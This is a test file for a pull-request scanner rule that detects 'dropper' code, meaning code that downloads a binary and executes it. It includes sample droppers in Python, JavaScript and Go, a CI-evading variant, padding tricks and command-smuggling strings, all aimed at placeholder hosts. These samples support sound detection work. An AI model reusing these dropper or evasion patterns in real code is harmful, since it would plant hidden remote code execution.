import pytest

from pr_scanner.models import ChangedFile, Diff, Severity
from pr_scanner.rules import default_registry
from pr_scanner.rules.dropper import RemoteBinaryExec


def file(path, *lines, status="added"):
    return ChangedFile(path=path, status=status, added_lines=tuple(enumerate(lines, 1)))


def run(*files):
    return list(RemoteBinaryExec().evaluate(Diff("a" * 40, "b" * 40, tuple(files))))


PY_DROPPER = [
    "import os, subprocess, urllib.request",
    "if not os.environ.get('CI'):",
    "    urllib.request.urlretrieve('https://example.invalid/bin/helper', '/tmp/.helper')",
    "    os.chmod('/tmp/.helper', 0o755)",
    "    subprocess.Popen(['/tmp/.helper'])",
]


def test_ci_aware_download_and_exec_is_critical():
    (f,) = run(file("src/demo/telemetry.py", *PY_DROPPER))
    assert f.rule_id == "EXEC-DROPPER"
    assert f.severity == Severity.CRITICAL
    assert f.file == "src/demo/telemetry.py"
    assert f.line == 4  # first execution signal (chmod)
    assert "CI" in f.rationale and "download" in f.rationale.lower()
    assert f.remediation


def test_download_and_spawn_without_ci_check_is_high():
    (f,) = run(file("lib/run.py", "import subprocess, requests", "b = requests.get('https://example.invalid/b').content", "subprocess.run(['/tmp/b'])"))
    assert f.severity == Severity.HIGH


def test_download_and_chmod_without_spawn_is_high():
    (f,) = run(file("scripts/setup.sh", "curl -o /tmp/x https://example.invalid/b", "chmod +x /tmp/x"))
    assert f.severity == Severity.HIGH


def test_raw_ip_download_is_critical():
    (f,) = run(file("lib/run.py", "import subprocess, requests", "b = requests.get('http://203.0.113.7/b').content", "subprocess.run(['/tmp/b'])"))
    assert f.severity == Severity.CRITICAL


def test_ci_check_plus_spawn_is_medium():
    (f,) = run(file("tools/t.py", "if os.environ.get('CI'):", "    subprocess.run(['pytest'])"))
    assert f.severity == Severity.MEDIUM


def test_javascript_dropper():
    (f,) = run(
        file(
            "lib/init.js",
            "const cp = require('child_process');",
            "if (!process.env.CI) {",
            "  https.get('https://example.invalid/b', (r) => r.pipe(fs.createWriteStream('/tmp/b')));",
            "  fs.chmodSync('/tmp/b', 0o755);",
            "  cp.spawn('/tmp/b');",
            "}",
        )
    )
    assert f.severity == Severity.CRITICAL


def test_go_dropper():
    (f,) = run(file("main.go", "resp, _ := http.Get(\"https://example.invalid/b\")", "os.Chmod(\"/tmp/b\", 0755)", "exec.Command(\"/tmp/b\").Start()"))
    assert f.severity == Severity.HIGH


@pytest.mark.parametrize(
    "path,lines",
    [
        ("src/a.py", ["subprocess.run(['git', 'rev-parse', 'HEAD'])"]),  # spawn only
        ("src/a.py", ["r = requests.get('https://api.example.invalid/data')"]),  # download only
        ("src/a.py", ["if os.environ.get('CI'):", "    color = False"]),  # CI check only
        ("src/a.py", ["os.chmod(path, 0o644)"]),  # chmod only
        ("src/a.js", ["const m = re.exec(s);", "fetch('/api')"]),  # regex.exec is not a process spawn
    ],
)
def test_single_signals_are_not_reported(path, lines):
    assert run(file(path, *lines)) == []


def test_signals_may_be_on_different_lines():
    lines = ["import subprocess", "", "def go():", "    pass", "", "url = 'https://example.invalid/b'", "data = urlopen(url).read()", "", "subprocess.call(['x'])"]
    (f,) = run(file("src/a.py", *lines))
    assert f.severity == Severity.HIGH


def test_commented_out_code_is_ignored():
    assert run(file("src/a.py", "# subprocess.run(['x'])", "# requests.get('https://example.invalid')")) == []
    assert run(file("src/a.js", "// child_process.spawn('x')", "// fetch('https://example.invalid')")) == []


def test_one_finding_per_file():
    fs = run(file("a.py", *PY_DROPPER), file("b.py", *PY_DROPPER))
    assert sorted(f.file for f in fs) == ["a.py", "b.py"]


def test_setup_py_is_included():
    assert run(file("setup.py", "import subprocess, requests", "requests.get('https://example.invalid/b')", "subprocess.run(['/tmp/b'])"))


@pytest.mark.parametrize("path", ["README.md", "docs/install.txt", "package-lock.json", "logo.png"])
def test_non_code_files_are_ignored(path):
    assert run(file(path, *PY_DROPPER)) == []


def test_removed_and_binary_files_are_ignored():
    assert run(file("a.py", *PY_DROPPER, status="removed")) == []
    binary = ChangedFile(path="a.py", status="added", is_binary=True)
    assert run(binary) == []


def test_padding_a_line_does_not_hide_the_payload():
    # regression: rules used to truncate lines at 4000 chars, so padding evaded them
    pad = " " * 200_000
    (f,) = run(file("a.py", pad + "subprocess.run(['x'])", pad + "requests.get('https://example.invalid/b')"))
    assert f.severity == Severity.HIGH


def test_registered_by_default():
    assert "EXEC-DROPPER" in {r.id for r in default_registry().rules()}


# ======================================================================================
# Large generated files (bundles): found by the real-world sample (2026-11-09). 12 of 800
# merged PRs were blocked because compiled JS-action bundles contain download code and
# process-spawn code in unrelated modules. Signals in a large file are correlated by
# proximity; small files keep whole-file correlation so padding cannot hide a payload.
# ======================================================================================

import time  # noqa: E402

from pr_scanner.engine import Engine  # noqa: E402
from pr_scanner.policy import Outcome, Policy  # noqa: E402
from pr_scanner.rules.dropper import LARGE_FILE_CODE_CHARS, WINDOW_CODE_CHARS  # noqa: E402
from tests.snippets import snippet  # noqa: E402

FILLER = "var v{n} = o.p{n}(a{n}, b{n}) + c{n};"
# Attack-like fragments come from tests/fixtures/snippets.txt so our own PR scan does not flag this file.
DOWNLOAD = snippet("download")
SPAWN = snippet("spawn")
CHMOD = snippet("chmod")
CI = snippet("ci")
RAW_IP = snippet("raw_ip")


def code_chars(lines):
    import re

    return sum(len(re.sub(r"\s+", "", t)) for t in lines)


def bundle(at: dict[int, list[str]], n: int = 4000, path: str = "dist/index.js") -> ChangedFile:
    """A large generated-looking file with the given lines inserted before filler line ``index``."""
    lines: list[str] = []
    for i in range(n):
        lines.extend(at.get(i, []))
        lines.append(FILLER.format(n=i))
    lines.extend(at.get(n, []))
    assert code_chars(lines) > LARGE_FILE_CODE_CHARS, "test helper must build a large file"
    return file(path, *lines)


def severities(findings):
    return [f.severity for f in findings]


def test_constants_have_the_values_the_real_world_data_supports():
    # real bundles: signals 6.8k..1.2M code chars apart; real droppers: < 200
    assert 500 <= WINDOW_CODE_CHARS <= 5000
    assert LARGE_FILE_CODE_CHARS >= 50_000


def test_bundle_with_download_and_spawn_in_unrelated_modules_is_not_high():
    f = bundle({100: [SPAWN], 3000: [DOWNLOAD]})
    out = run(f)
    assert severities(out) == [Severity.LOW]
    assert "far" in out[0].rationale.lower() or "not close" in out[0].rationale.lower()


def test_ci_variables_somewhere_in_a_bundle_do_not_escalate_unrelated_signals():
    f = bundle({100: [SPAWN], 1500: [CI], 3000: [DOWNLOAD], 3500: [CI]})
    assert severities(run(f)) == [Severity.LOW]


def test_raw_ip_far_from_the_signals_does_not_escalate():
    f = bundle({100: [SPAWN], 1500: [RAW_IP], 3000: [DOWNLOAD]})
    assert severities(run(f)) == [Severity.LOW]


def test_a_tight_dropper_hidden_inside_a_large_bundle_is_still_high():
    f = bundle({2000: [DOWNLOAD, "const w = fs.writeFileSync(bin, r);", CHMOD, SPAWN]})
    out = run(f)
    assert severities(out) == [Severity.HIGH]
    assert "download" in out[0].rationale.lower()


def test_tight_ci_aware_dropper_in_a_large_bundle_is_critical():
    f = bundle({2000: [CI, DOWNLOAD, CHMOD, SPAWN]})
    assert severities(run(f)) == [Severity.CRITICAL]


def test_tight_raw_ip_dropper_in_a_large_bundle_is_critical():
    f = bundle({2000: [RAW_IP, DOWNLOAD, SPAWN]})
    assert severities(run(f)) == [Severity.CRITICAL]


def test_windowed_finding_points_at_the_clustered_execution_line_not_an_earlier_unrelated_one():
    # an unrelated spawn far above; the real cluster is lower down
    f = bundle({100: [snippet("spawn_short")], 3000: [DOWNLOAD, CHMOD]})
    out = run(f)
    assert severities(out) == [Severity.HIGH]
    lines = [t for _, t in f.added_lines]
    assert "chmodSync" in lines[out[0].line - 1]


def test_spawn_and_ci_close_together_in_a_large_file_is_medium_far_apart_is_nothing():
    near = bundle({2000: [CI, SPAWN]})
    far = bundle({100: [SPAWN], 3500: [CI]})
    assert severities(run(near)) == [Severity.MEDIUM]
    assert run(far) == []


def test_minified_single_line_with_distant_signals_is_not_high():
    pad = "var q=1;" * 40_000  # 320k code chars between the signals, on one line
    big = file("dist/index.cjs", f"{SPAWN}{pad}{DOWNLOAD}", *[FILLER.format(n=i) for i in range(3000)])
    assert severities(run(big)) == [Severity.LOW]


def test_minified_single_line_with_close_signals_is_high():
    big = file("dist/index.cjs", f"var a=1;{DOWNLOAD}var b=2;{CHMOD}{SPAWN}", *[FILLER.format(n=i) for i in range(4000)])
    assert severities(run(big)) == [Severity.HIGH]


@pytest.mark.parametrize("extra,expected", [(0, Severity.HIGH), (1, Severity.LOW)])
def test_window_boundary_is_inclusive_in_code_characters(extra, expected):
    # distance is measured between the start of the two matches
    spawn_open, fetch_open = snippet("spawn_open"), snippet("fetch_open")
    gap = WINDOW_CODE_CHARS - len(spawn_open) - 1 + extra
    line = spawn_open + "a" * gap + fetch_open
    f = file("dist/x.js", line, *[FILLER.format(n=i) for i in range(4000)])
    assert severities(run(f)) == [expected]


# ---- padding must still not help (the project's long-standing rule) -------------------------


def test_small_file_keeps_whole_file_correlation_even_with_code_padding_between():
    lines = [SPAWN] + [FILLER.format(n=i) for i in range(300)] + [DOWNLOAD]  # ~10k code chars apart
    assert code_chars(lines) < LARGE_FILE_CODE_CHARS
    assert severities(run(file("src/a.js", *lines))) == [Severity.HIGH]


def test_whitespace_padding_cannot_separate_signals_in_a_large_file():
    f = bundle({2000: [SPAWN + " " * 150_000 + DOWNLOAD]})
    assert severities(run(f)) == [Severity.HIGH]


def test_whitespace_padding_cannot_make_a_small_file_count_as_large():
    pad = " " * 150_000
    f = file("a.js", SPAWN, pad, *[FILLER.format(n=i) for i in range(300)], DOWNLOAD)
    assert severities(run(f)) == [Severity.HIGH]


def test_comment_line_padding_cannot_separate_signals():
    comments = [f"// padding {i} " + "x" * 80 for i in range(5000)]
    f = bundle({2000: [SPAWN] + comments + [DOWNLOAD]})
    assert severities(run(f)) == [Severity.HIGH]


def test_inline_block_comment_padding_cannot_separate_signals():
    f = bundle({2000: [SPAWN + "/*" + "x" * 150_000 + "*/" + DOWNLOAD]})
    assert severities(run(f)) == [Severity.HIGH]


def test_zero_width_character_padding_cannot_separate_signals():
    f = bundle({2000: [SPAWN + "​" * 500_000 + DOWNLOAD]})
    assert severities(run(f)) == [Severity.HIGH]


def test_a_comment_opener_inside_a_string_cannot_hide_a_signal():
    # detection never strips comments, or `"/*"` would become an evasion trick
    f = file("a.js", 'const x = "/*";', DOWNLOAD, SPAWN, 'const y = "*/";')
    assert severities(run(f)) == [Severity.HIGH]


def test_known_limit_code_padding_inside_a_large_file_separates_signals():
    # Documented, not desired: >100k code chars of real-looking code between two signals in a
    # file this big is reported only as LOW. The LOW finding keeps it visible to a reviewer.
    lines = [SPAWN] + [FILLER.format(n=i) for i in range(4000)] + [DOWNLOAD]
    out = run(file("dist/index.js", *lines))
    assert severities(out) == [Severity.LOW]


def test_the_large_file_threshold_is_in_code_characters_and_exclusive():
    def make(total):
        head, tail = [SPAWN], [DOWNLOAD]
        fixed = code_chars(head + tail)
        body = []
        remaining = total - fixed
        while remaining > 0:
            n = min(100, remaining)
            body.append("a" * n)
            remaining -= n
        return file("dist/x.js", *(head + body + tail))

    assert severities(run(make(LARGE_FILE_CODE_CHARS))) == [Severity.HIGH]  # not large: whole-file
    assert severities(run(make(LARGE_FILE_CODE_CHARS + 1))) == [Severity.LOW]  # large: windowed


# ---- reporting and verdict --------------------------------------------------------------------


def test_low_finding_is_explainable_and_attributed():
    (f,) = run(bundle({100: [SPAWN], 3000: [DOWNLOAD]}))
    assert f.rule_id == "EXEC-DROPPER" and f.file == "dist/index.js" and f.line >= 1
    assert f.evidence.strip() and f.rationale and f.remediation
    assert 0 < f.confidence <= 0.5


def test_each_large_file_is_judged_separately():
    a = bundle({100: [SPAWN], 3000: [DOWNLOAD]}, path="dist/a.js")
    b = bundle({2000: [DOWNLOAD, SPAWN]}, path="dist/b.js")
    out = {f.file: f.severity for f in run(a, b)}
    assert out == {"dist/a.js": Severity.LOW, "dist/b.js": Severity.HIGH}


def test_an_unrelated_bundle_regeneration_passes_the_verdict():
    result = Engine(default_registry()).scan(
        Diff("a" * 40, "b" * 40, (bundle({100: [SPAWN], 1500: [CI], 3000: [DOWNLOAD]}),)), Policy()
    )
    assert result.verdict.outcome is Outcome.PASS
    assert [f.severity for f in result.findings if f.rule_id == "EXEC-DROPPER"] == [Severity.LOW]


def test_a_tight_dropper_in_a_regenerated_bundle_blocks_the_verdict():
    result = Engine(default_registry()).scan(
        Diff("a" * 40, "b" * 40, (bundle({2000: [CI, DOWNLOAD, CHMOD, SPAWN]}),)), Policy()
    )
    assert result.verdict.outcome is Outcome.BLOCK


# ---- performance on bundle-sized input ----------------------------------------------------------


@pytest.mark.perf
def test_a_dense_multi_megabyte_bundle_is_scanned_in_reasonable_time():
    lines, tail = [], snippet("dense_tail")
    for i in range(30_000):
        lines.append(f"{FILLER.format(n=i)} {tail.format(i=i)}")
    f = file("dist/big.js", *lines)
    start = time.perf_counter()
    out = run(f)
    assert time.perf_counter() - start < 20
    assert severities(out) == [Severity.HIGH]


@pytest.mark.perf
def test_a_line_with_a_hundred_thousand_matches_does_not_blow_up():
    f = file("dist/m.js", snippet("spawn_stmt") * 100_000, *[FILLER.format(n=i) for i in range(4000)])
    start = time.perf_counter()
    run(f)
    assert time.perf_counter() - start < 10


# ---- package-manager spawns are not "run a downloaded binary" (fresh-sample false positive) ----

BENIGN_PM_SPAWNS = [
    "let process = await spawn('pnpm next dev')",  # tailwindcss integration test shape
    "const p = execSync('npm run dev')",
    "child = spawn('yarn', ['test', '--watch'])",
    "subprocess.run(['npm', 'run', 'build'], check=True)",
    "subprocess.Popen('pnpm vite build', shell=True)",
    'cmd := exec.Command("bun", "run", "dev")',
]


@pytest.mark.parametrize("spawn_line", BENIGN_PM_SPAWNS)
def test_spawning_a_package_manager_script_with_a_fetch_is_not_a_dropper(spawn_line):
    path = "integrations/dev.test.ts" if ";" not in spawn_line and "subprocess" not in spawn_line else "tests/dev.py"
    lines = [spawn_line, "let html = await fetch(url).then((r) => r.text())"]
    if path.endswith(".py"):
        lines = [spawn_line, "html = requests.get(url).text"]
    assert run(file(path, *lines)) == []


EVASIONS = [
    "execSync('npx https://example.invalid/x')",
    "execSync('npm install https://example.invalid/x.tgz')",
    "execSync('pnpm dlx some-package')",
    "execSync('npm exec some-package')",
    "execSync('npm add some-package')",
    "execSync(`pnpm ${name}`)",
    "execSync('npm run build && sh x.sh')",
    "execSync('npm run build; sh x.sh')",
    "execSync('pnpm run dev | sh')",
    "execSync('npm run ./payload')",
    "execSync('sudo python3 /tmp/x.py')",
    "execSync('pnpm', ['run', '/tmp/x'])",
    "execSync('npm run build $(curl x)')",
]


@pytest.mark.parametrize("spawn_line", EVASIONS)
def test_package_manager_exemption_does_not_cover_these(spawn_line):
    findings = run(file("src/a.js", spawn_line, "https.get('https://example.invalid/b', cb)"))
    assert findings and findings[0].severity >= Severity.HIGH


def test_a_package_manager_spawn_does_not_hide_a_second_real_spawn():
    findings = run(file("src/a.js", "spawn('pnpm next dev')", "https.get('https://example.invalid/b', cb)", "spawn('/tmp/.helper')"))
    assert findings and findings[0].severity >= Severity.HIGH
    assert findings[0].line == 3
